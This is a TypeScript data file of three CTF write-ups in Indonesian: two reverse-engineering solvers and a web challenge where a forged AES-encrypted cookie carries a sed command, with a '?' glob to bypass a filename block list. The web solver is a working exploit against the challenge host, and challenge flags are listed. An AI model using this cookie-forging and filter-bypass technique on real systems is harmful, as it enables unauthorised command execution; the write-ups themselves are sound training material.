import type { WriteUp } from '../types';

// Bhackari — 3 writeups
export const bhackariWriteups: WriteUp[] = [
  {
    "id": "bhackari-rev-dontunpackme",
    "title": "- Don't unpack me",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Bhackari",
    "tags": [],
    "description": "Writeup for challenge - Don't unpack me",
    "problemDescription": "Challenge ini bukan sekadar packed binary biasa. File utama bertindak sebagai loader yang membawa PE lain di dalam section `.x`. Jika PE bagian dalam diekstrak dan dijalankan langsung, program hanya menampilkan pesan palsu:\n\n```text\nI told you not to unpack me...\nNow look what you've done!\n```\n\nPesan itu adalah jebakan. Payload bagian dalam membutuhkan patch runtime dari loader luar dan juga byte kode dari DLL tertentu untuk menghasilkan flag asli.\n\nFlag yang ditemukan:\n\n```text\nbhackariCTF{7zip_1s_aw3s0m3}\n```",
    "tools": [],
    "analysis": "Payload bagian dalam memiliki alur utama seperti ini:\n\n1. Memuat `findme.dll`.\n2. Mengambil alamat export `GetHandlerProperty2`.\n3. Mengecek versi DLL harus `24.09`.\n4. Mengambil 0x250 byte pertama dari fungsi `GetHandlerProperty2`.\n5. Menghitung CRC32 dari 0x250 byte tersebut.\n6. CRC32 digunakan sebagai key RC4 4 byte little-endian.\n7. Ciphertext 28 byte dibuat dari beberapa byte fungsi `GetHandlerProperty2`, sebagian langsung dan sebagian dari hasil XOR dua posisi byte.\n8. Ciphertext didekripsi dengan RC4.\n9. Hasil plaintext dicek harus diawali dengan `bhac`.\n10. Jika benar, plaintext adalah flag.\n\nCRC32 dari 0x250 byte awal `GetHandlerProperty2` pada `7z.dll` 24.09 x64 menghasilkan key:\n\n```text\n8c95cd23\n```\n\nCiphertext yang dibangun dari byte fungsi adalah:\n\n```text\n4ea617b13a1b4db37a1ee082216a5202fab3e7e7dfd821e912f2d48f\n```\n\nSetelah didekripsi dengan RC4, hasilnya adalah:\n\n```text\nbhackariCTF{7zip_1s_aw3s0m3}\n```",
    "solution": [
      {
        "title": "File awal",
        "content": "Arsip challenge berisi binary Windows:\n\n\n\nHasil identifikasi awal menunjukkan binary ini adalah PE64 kecil. Di dalamnya terdapat section tidak biasa bernama `.x` yang berisi PE lain. PE bagian dalam bisa diekstrak dari section tersebut, tetapi tidak cukup untuk mendapatkan flag karena logic utamanya bergantung pada loader luar.",
        "code": "dont_unpack_me.exe"
      },
      {
        "title": "Solver",
        "content": "Script tersebut akan mencoba membaca `7z.dll` di folder yang sama. Jika `7z.dll` tersedia, solver akan mengambil export `GetHandlerProperty2`, menghitung CRC32, membangun ciphertext dari byte fungsi, lalu mendekripsi flag.\n\nJika `7z.dll` tidak tersedia, solver tetap bisa berjalan menggunakan konstanta hasil recovery agar proses reproduksi flag tetap mudah.\n\nCara menjalankan:\n\n\n\nOutput:",
        "code": "solve.py"
      },
      {
        "title": "Kesimpulan",
        "content": "Trik utama challenge ini adalah membuat unpacking manual terlihat gagal. Payload bagian dalam memang sengaja tidak lengkap jika dipisahkan dari loader. Loader luar melakukan patching dan mengarahkan payload agar menggunakan byte dari fungsi `GetHandlerProperty2` milik 7-Zip 24.09. Dengan merekonstruksi dependency dan algoritma dekripsi RC4, flag berhasil diekstrak secara valid."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport struct\r\nimport zlib\r\n\r\n# Byte selections recovered from the protected inner payload.\r\nIDX = [\r\n    (0x15A,), (0x234, 0x73), (0x191,), (0x111, 0x6B),\r\n    (0x48,), (0x145, 0x15), (0xBF, 0x23), (0x99, 0x53),\r\n    (0x189, 0x60), (0x111, 0x5C), (0x177, 0xAD), (0x18B, 0x156),\r\n    (0x226,), (0xE7, 0x6B), (0x20D, 0x102), (0x2F,),\r\n    (0x1A1, 0x9A), (0x1BC, 0x3D), (0x139, 0x7C), (0x1CC, 0x3E),\r\n    (0x1B1,), (0x103, 0xA6), (0x226,), (0x2D,),\r\n    (0x37,), (0x1DF, 0xDE), (0xAC, 0x7B), (0xE6, 0x21),\r\n]\r\n\r\n# Fallback constants derived from 7-Zip 24.09 x64 7z.dll::GetHandlerProperty2.\r\nFALLBACK_KEY = bytes.fromhex(\"8c95cd23\")\r\nFALLBACK_CT = bytes.fromhex(\"4ea617b13a1b4db37a1ee082216a5202fab3e7e7dfd821e912f2d48f\")\r\n\r\n\r\ndef u16(buf, off):\r\n    return struct.unpack_from(\"<H\", buf, off)[0]\r\n\r\n\r\ndef u32(buf, off):\r\n    return struct.unpack_from(\"<I\", buf, off)[0]\r\n\r\n\r\ndef rva_to_offset(buf, rva):\r\n    pe = u32(buf, 0x3C)\r\n    number_of_sections = u16(buf, pe + 6)\r\n    opt_size = u16(buf, pe + 20)\r\n    sec = pe + 24 + opt_size\r\n\r\n    for i in range(number_of_sections):\r\n        base = sec + i * 40\r\n        virtual_size = u32(buf, base + 8)\r\n        virtual_address = u32(buf, base + 12)\r\n        raw_size = u32(buf, base + 16)\r\n        raw_ptr = u32(buf, base + 20)\r\n        size = max(virtual_size, raw_size)\r\n        if virtual_address <= rva < virtual_address + size:\r\n            return raw_ptr + (rva - virtual_address)\r\n    raise ValueError(f\"RVA 0x{rva:x} is outside all PE sections\")\r\n\r\n\r\ndef find_export_offset(buf, export_name):\r\n    pe = u32(buf, 0x3C)\r\n    export_rva = u32(buf, pe + 24 + 0x70)\r\n    if export_rva == 0:\r\n        raise ValueError(\"PE has no export directory\")\r\n\r\n    exp = rva_to_offset(buf, export_rva)\r\n    number_of_functions = u32(buf, exp + 20)\r\n    number_of_names = u32(buf, exp + 24)\r\n    address_of_functions = u32(buf, exp + 28)\r\n    address_of_names = u32(buf, exp + 32)\r\n    address_of_ordinals = u32(buf, exp + 36)\r\n\r\n    funcs = rva_to_offset(buf, address_of_functions)\r\n    names = rva_to_offset(buf, address_of_names)\r\n    ords = rva_to_offset(buf, address_of_ordinals)\r\n\r\n    for i in range(number_of_names):\r\n        name_rva = u32(buf, names + i * 4)\r\n        name_off = rva_to_offset(buf, name_rva)\r\n        end = buf.index(b\"\\x00\", name_off)\r\n        name = buf[name_off:end].decode(\"ascii\", errors=\"replace\")\r\n        if name == export_name:\r\n            ordinal = u16(buf, ords + i * 2)\r\n            if ordinal >= number_of_functions:\r\n                raise ValueError(\"invalid export ordinal\")\r\n            func_rva = u32(buf, funcs + ordinal * 4)\r\n            return rva_to_offset(buf, func_rva)\r\n\r\n    raise ValueError(f\"export {export_name!r} not found\")\r\n\r\n\r\ndef rc4(key, data):\r\n    s = list(range(256))\r\n    j = 0\r\n    for i in range(256):\r\n        j = (j + s[i] + key[i % len(key)]) & 0xFF\r\n        s[i], s[j] = s[j], s[i]\r\n\r\n    out = bytearray()\r\n    i = j = 0\r\n    for byte in data:\r\n        i = (i + 1) & 0xFF\r\n        j = (j + s[i]) & 0xFF\r\n        s[i], s[j] = s[j], s[i]\r\n        out.append(byte ^ s[(s[i] + s[j]) & 0xFF])\r\n    return bytes(out)\r\n\r\n\r\ndef solve_from_7z_dll(path):\r\n    buf = Path(path).read_bytes()\r\n    off = find_export_offset(buf, \"GetHandlerProperty2\")\r\n    func = buf[off:off + 0x250]\r\n    if len(func) != 0x250:\r\n        raise ValueError(\"GetHandlerProperty2 function bytes are too short\")\r\n\r\n    key = zlib.crc32(func).to_bytes(4, \"little\")\r\n    ciphertext = bytes(\r\n        func[item[0]] if len(item) == 1 else func[item[0]] ^ func[item[1]]\r\n        for item in IDX\r\n    )\r\n    return rc4(key, ciphertext).decode(\"ascii\")\r\n\r\n\r\ndef main():\r\n    dll = Path(\"7z.dll\")\r\n    if dll.exists():\r\n        flag = solve_from_7z_dll(dll)\r\n    else:\r\n        # Keeps the solver reproducible even when only the recovered constants are present.\r\n        flag = rc4(FALLBACK_KEY, FALLBACK_CT).decode(\"ascii\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bhackariCTF{7zip_1s_aw3s0m3}",
    "lessonsLearned": ""
  },
  {
    "id": "bhackari-rev-mystery",
    "title": "Mystery CTF",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Bhackari",
    "tags": [],
    "description": "Writeup for challenge Mystery CTF",
    "problemDescription": "",
    "tools": [],
    "analysis": "Challenge ini memberikan dua file:\n- `mystery.so`: Sebuah shared library (Python extension module).\n- `flag.enc`: Data terenkripsi yang berisi flag.\n\nDengan menggunakan perintah `nm -D`, kita bisa melihat bahwa `mystery.so` mengekspor fungsi `PyInit_mystery`, yang menunjukkan bahwa ini adalah modul Python.\n\nSetelah mengimpor modul tersebut di Python, kita menemukan beberapa fungsi menarik:\n- `easy_access()`: Memberikan flag palsu/troll.\n- `get_runtime_info()`: Memberikan informasi runtime (noise dan table0).\n- `stage(index, value)`: Fungsi untuk mengirimkan nilai untuk 4 tahapan trial.\n- `reveal()`: Fungsi untuk menampilkan flag asli jika ke-4 tahapan sudah diselesaikan dengan benar.",
    "solution": [
      {
        "title": "2. Reverse Engineering",
        "content": "Analisis disassembly pada fungsi `stage` menunjukkan bahwa setiap tahapan (1-4) divalidasi dengan memanggil fungsi internal tertentu:\n- Stage 1 memanggil fungsi di offset `0x31ec`.\n- Stage 2 memanggil fungsi di offset `0x3271`.\n- Stage 3 memanggil fungsi di offset `0x3304`.\n- Stage 4 memanggil fungsi di offset `0x33ef`.\n\nSetiap fungsi pembantu ini bersifat deterministik namun bergantung pada tabel internal yang diinisialisasi saat runtime (berdasarkan hash SHA256 dari file `mystery.so` itu sendiri) dan beberapa nilai lainnya (seperti CRC32 dari file)."
      },
      {
        "title": "3. Exploitation Strategy",
        "content": "Karena fungsi-fungsi pembantu tersebut ada di dalam library dan bersifat deterministik, kita bisa langsung memanggilnya menggunakan `ctypes` setelah library dimuat.\n\nLangkah-langkah pada script `solve.py`:\n1. Memuat `mystery.so` menggunakan `ctypes`.\n2. Menemukan base address library di memory melalui `/proc/self/maps`.\n3. Menginisialisasi modul (memanggil `get_runtime_info` untuk memastikan constructor dijalankan).\n4. Memanggil ke-4 fungsi pembantu stage secara langsung dengan argument index yang sesuai (1, 2, 3, 4).\n5. Mengambil nilai kembalian (expected value) dari masing-masing fungsi tersebut.\n6. Mengirimkan nilai-nilai tersebut kembali ke fungsi `mystery.stage()`.\n7. Memanggil `mystery.reveal()` untuk mendapatkan flag asli."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import mystery\r\nimport ctypes\r\nimport os\r\n\r\n# Find the base address of mystery.so\r\nwith open(\"/proc/self/maps\", \"r\") as f:\r\n    for line in f:\r\n        if \"mystery.so\" in line and \"r-xp\" in line:\r\n            mapping_start = int(line.split(\"-\")[0], 16)\r\n            elf_base = mapping_start - 0x2000\r\n            break\r\n    else:\r\n        raise Exception(\"Could not find mystery.so in memory maps\")\r\n\r\nprint(f\"Elf base: {hex(elf_base)}\")\r\n\r\n# Initialize the mystery module (this runs the constructors)\r\nmystery.get_runtime_info()\r\n\r\n# Define the helper function types\r\n# All stage helpers have signature: int func(int index)\r\n# Wait, let's check the disassembly again. Yes, edi = index.\r\n\r\nstage_helpers = [0x31ec, 0x3271, 0x3304, 0x33ef]\r\nexpected_values = []\r\n\r\n# We need a way to call these addresses. \r\n# We can use ctypes.CFUNCTYPE\r\nStageFunc = ctypes.CFUNCTYPE(ctypes.c_uint32, ctypes.c_uint32)\r\n\r\nfor i, offset in enumerate(stage_helpers):\r\n    addr = elf_base + offset\r\n    func = StageFunc(addr)\r\n    val = func(i + 1)\r\n    expected_values.append(val)\r\n    print(f\"Stage {i+1} expected value: {val} (hex: {hex(val)})\")\r\n\r\n# Now submit the stages\r\nfor i, val in enumerate(expected_values):\r\n    try:\r\n        mystery.stage(i + 1, val)\r\n        print(f\"Stage {i+1} submitted successfully.\")\r\n    except Exception as e:\r\n        print(f\"Stage {i+1} submission failed: {e}\")\r\n\r\n# Finally, reveal the flag\r\ntry:\r\n    res = mystery.reveal()\r\n    print(f\"Reveal result: {res}\")\r\nexcept Exception as e:\r\n    print(f\"Reveal failed: {e}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "bhackariCTF{F1n4lly_th4_My$t3rY_!S_$OlvEd!!!}",
    "lessonsLearned": ""
  },
  {
    "id": "bhackari-web-bhackistreaming",
    "title": "BhAcKAri Streaming Service - CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Bhackari",
    "tags": [],
    "description": "**Challenge:** BhAcKAri Streaming Service  \n**Category:** Web  \n**Flag:** `bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}`",
    "problemDescription": "1. **Obfuscated credentials** - AES key tersembunyi dalam JS obfuscated tapi bisa di-reverse\n2. **Cookie-based RCE** - Server mengeksekusi command dari encrypted cookie\n3. **Incomplete input validation** - Filter mengizinkan `?` tanpa memikirkan glob expansion\n4. **Sensitive data in client-side code** - Key enkripsi ada di JavaScript publik\n\n---",
    "tools": [
      "curl",
      "HTTP requests",
      "node.js",
      "Decode JS obfuscation",
      "python3",
      "pycryptodome",
      "AES decrypt/encrypt"
    ],
    "analysis": "Server di port 5687:\n- Menerima **POST ke `/`** dengan cookie `payload`\n- Decrypt cookie, parse JSON, eksekusi field `cmd` sebagai sed command\n- Filter: hanya karakter **huruf, spasi, `-`, `?`** yang diizinkan\n- `flag.txt` diblok secara eksplisit by name\n- Opsi sed `-e`, `-f` diblok",
    "solution": [
      {
        "title": "Overview",
        "content": "Website streaming anime palsu yang menyembunyikan \"ad server\" tersembunyi. Challenge ini melibatkan:\n1. Reverse engineering JavaScript yang di-obfuscate\n2. Decode ROT-14 cipher\n3. Decode custom encoding scheme\n4. Decrypt AES-256-CBC cookie\n5. Eksekusi command via sed dengan bypass filter\n\n---"
      },
      {
        "title": "Step 1: Reconnaissance",
        "content": "HTML mengandung JavaScript besar yang di-obfuscate. Ada dua hal mencurigakan:\n- **Cookie `payload`** di-set dengan nilai hex panjang\n- **Ad server** di port 5687",
        "code": "curl http://streaming.challs.ctf.bhackari.it:8000/"
      },
      {
        "title": "Step 2: Decode ROT-14 Obfuscation",
        "content": "Semua string dalam JS di-encode dengan ROT-14 (substitusi Caesar +14). Decode key constants:\n\n| Encoded | Decoded |\n|---------|---------|\n| `xaomxtaef:5687` | `localhost:5687` |\n| `efdqmyuzs.otmxxe...` | `streaming.challs...` |\n| `pahd=fdgq` | `dovr=true` |\n| `/mpe` | `/ads` |\n| `BAEF` | `POST` |\n| `bmkxamp` | `payload` |\n\nAd server menerima **POST ke `/`** dengan cookie `payload`."
      },
      {
        "title": "Step 3: Decode Custom Encoding (Fe function)",
        "content": "Di `player.html` ada komentar `/*use this abdul*/` dan fungsi `Fe()` yang decode string tersembunyi. String di akhir script berisi pesan dari sysadmin ke \"Abdul\":\n\n\n\nOutput:\n\n\n**Key ditemukan!** AES-256-CBC dengan:\n- Key: `inshallah_nobody_will_steal_this`\n- IV: 16 null bytes",
        "code": "// Decode dengan node.js\nconst vo = 'YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,';\nfunction Fe(e) { ... }\nFe(encodedString)"
      },
      {
        "title": "Step 4: Decrypt Cookie",
        "content": "Cookie `payload` adalah AES-256-CBC encrypted JSON berisi perintah `sed`:\n\n\n\nHasil decrypt dari index.html cookie:",
        "code": "from Crypto.Cipher import AES\nkey = b'inshallah_nobody_will_steal_this'\niv = bytes(16)\nct = bytes.fromhex(cookie_value)\nAES.new(key, AES.MODE_CBC, iv).decrypt(ct)"
      },
      {
        "title": "Step 6: Exploit - Glob Bypass dengan `?`",
        "content": "Karakter `?` diizinkan oleh filter karena sysadmin hanya memikirkan sed options, bukan **shell glob wildcard**!\n\n`flag?txt` akan di-expand oleh shell menjadi `flag.txt` karena `?` match satu karakter apapun.",
        "code": "from Crypto.Cipher import AES\n\nkey = b'inshallah_nobody_will_steal_this'\niv  = bytes(16)\n\ncmd = '{\"cmd\": \"sed -n p flag?txt\"}\\n'\npad = 16 - (len(cmd) % 16)\nct  = AES.new(key, AES.MODE_CBC, iv).encrypt(cmd.encode() + bytes([pad]*pad))\n\nimport requests\nrequests.post(\n    \"http://streaming.challs.ctf.bhackari.it:5687/\",\n    cookies={\"payload\": ct.hex()}\n)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nBhAcKAri Streaming Service - CTF Solver\r\nFlag: bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}\r\n\"\"\"\r\n\r\nfrom Crypto.Cipher import AES\r\nimport requests\r\n\r\nTARGET_5687 = \"http://streaming.challs.ctf.bhackari.it:5687\"\r\nKEY = b'inshallah_nobody_will_steal_this'\r\nIV  = bytes(16)\r\n\r\ndef encrypt_cmd(cmd_str: str) -> str:\r\n    if not cmd_str.endswith('\\n'):\r\n        cmd_str += '\\n'\r\n    pad = 16 - (len(cmd_str) % 16)\r\n    plaintext = cmd_str.encode() + bytes([pad] * pad)\r\n    return AES.new(KEY, AES.MODE_CBC, IV).encrypt(plaintext).hex()\r\n\r\ndef decrypt_payload(hex_str: str) -> bytes:\r\n    ct = bytes.fromhex(hex_str)\r\n    if len(ct) % 16:\r\n        ct += bytes(16 - len(ct) % 16)\r\n    return AES.new(KEY, AES.MODE_CBC, IV).decrypt(ct)\r\n\r\ndef send_cmd(cmd_str: str) -> str:\r\n    payload = encrypt_cmd(cmd_str)\r\n    print(f\"    Payload hex: {payload}\")\r\n    resp = requests.post(TARGET_5687 + \"/\", cookies={\"payload\": payload})\r\n    # Flag ada di baris pertama, sebelum ASCII art braille\r\n    # Filter: skip baris HTML, skip baris dengan karakter braille (U+2800+)\r\n    for line in resp.text.split('\\n'):\r\n        stripped = line.strip()\r\n        if not stripped:\r\n            continue\r\n        if stripped.startswith('<'):\r\n            continue\r\n        # skip braille/box drawing unicode\r\n        if any(0x2800 <= ord(c) <= 0x2FFF for c in stripped):\r\n            continue\r\n        return stripped\r\n    return \"(no output)\"\r\n\r\ndef main():\r\n    print(\"[*] BhAcKAri Streaming Service - Solver\")\r\n    print()\r\n\r\n    print(\"[*] Step 1: Decrypting index.html cookie to get AES key...\")\r\n    index_cookie = (\r\n        \"8724c6792e7393762199d1728f5982adb8c0dc1a1442c4a2143d2ce00abfc573\"\r\n        \"d3f62220835420dab78b90f151288109c7094821764c6eddf0f26bac916d5e51\"\r\n        \"f0314873fd76f44377d02b2859b9fe81b2b4f088280b85f75db68163a402aa33\"\r\n        \"ee2f6fdcd68591232d1d2d4fb343ec855022bb572a571403f545525ac1b7fb21\"\r\n        \"07d3b991c4f74b569653f568fdf15184a557aaf1cbd9dc8b34678748f8c1fdc1\"\r\n        \"04848a02a8c0f9f790cc67e7dd5a6db595f6380ae4c2e5a443dab114130677b6\"\r\n        \"87b8fd96de8bf2c853f2924602850efadaa9efb4b9151b04db0baf93eefa40d2\"\r\n        \"e6c5ba288a2a90602ee61b224f1209d50013ab137c00c641352d980a41196b61\"\r\n        \"41bf9b82af7f363c4d6c86dedd9b6866ebf6644b319869e8254f7d4e5a1a1f2f\"\r\n        \"7aa1a1558a3d38e2f8b5c047f72beee67c7fbf3dc2a49310a4ac7ec712c9b81\"\r\n        \"09fc0a76edf5915ee4209239d664262b4f24c7e986396c86a7112f5a762a75d0\"\r\n        \"b8e2a34591706a39dfd10b818983f84302d8804cd85e8a302406868124b316e7\"\r\n        \"aa5d25f71c2f97240f213f3ff6357e372b2abbfaa4110b9b1d919b3be3a7d272\"\r\n        \"daf876130068db5bb1bc65f32a5658db58bf2ed3e2b5812e5e8899bfad6d448b\"\r\n        \"31e52a946b790443cd4e86d27635dc22626586287615f6845f1a1ac638f4b6fb\"\r\n        \"42340dfa902961d55371a0d083f33ecc8\"\r\n    )\r\n    decrypted = decrypt_payload(index_cookie)\r\n    print(f\"    Key found  : {KEY.decode()}\")\r\n    print(f\"    IV         : {IV.hex()}\")\r\n    print(f\"    Mode       : AES-256-CBC\")\r\n    print(f\"    Decrypted  : {decrypted[:80]}...\")\r\n    print()\r\n\r\n    print(\"[*] Step 2: Reading flag using sed with ? glob bypass...\")\r\n    print(\"    'flag?txt' glob matches 'flag.txt', bypassing filename filter\")\r\n    result = send_cmd('{\"cmd\": \"sed -n p flag?txt\"}')\r\n    print()\r\n    print(f\"[+] FLAG: {result}\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}",
    "lessonsLearned": ""
  }
];
